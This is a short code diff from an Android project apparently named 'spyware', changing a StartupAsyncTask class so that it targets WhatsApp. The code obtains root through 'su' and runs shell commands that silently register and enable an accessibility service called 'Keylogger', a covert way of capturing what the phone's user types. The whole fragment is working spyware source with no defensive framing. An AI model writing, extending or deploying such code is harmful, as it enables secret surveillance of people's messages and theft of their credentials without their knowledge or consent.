@@ -7,7 +7,8 @@ import java.io.DataOutputStream;
 
 public class StartupAsyncTask extends AsyncTask<Void, Void, Void> {
 
-    final String packageName = "com.example.cristianturetta.spyware";
+    final private String packageName = "com.whatsapp";
+    final private String accessibilityPackage = "com.example.cristianturetta.spyware";
 
     @Override
     protected Void doInBackground(Void... params) {
@@ -45,7 +46,7 @@ public class StartupAsyncTask extends AsyncTask<Void, Void, Void> {
         try {
             Process process = Runtime.getRuntime().exec("su");
             DataOutputStream os = new DataOutputStream(process.getOutputStream());
-            os.writeBytes("settings put secure enabled_accessibility_services " + packageName +"/"+ packageName + ".Keylogger\n");
+            os.writeBytes("settings put secure enabled_accessibility_services " + packageName +"/"+ accessibilityPackage + ".Keylogger\n");
             os.flush();
             os.writeBytes("settings put secure accessibility_enabled 1\n");
             os.flush();
